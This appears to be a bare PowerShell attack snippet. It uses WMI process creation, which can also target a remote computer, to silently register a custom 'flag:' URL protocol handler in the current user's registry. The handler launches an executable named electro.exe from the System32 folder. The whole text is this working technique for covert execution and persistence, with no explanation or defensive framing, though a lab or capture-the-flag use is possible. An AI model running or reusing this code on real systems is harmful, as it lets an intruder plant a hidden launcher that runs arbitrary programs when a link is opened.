$ComputerName = $env:computername
$Handler = "flag"
$Command = "cmd.exe /Q /c reg add HKEY_CURRENT_USER\Software\Classes\$($Handler) /d ""URL: $($Handler)"" /v ""URL Protocol"" /f && reg add HKEY_CURRENT_USER\Software\Classes\$($Handler)\shell\open\command /d ""C:\Windows\System32\cmd.exe /c start C:\Windows\System32\electro.exe"""
$Process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $Command
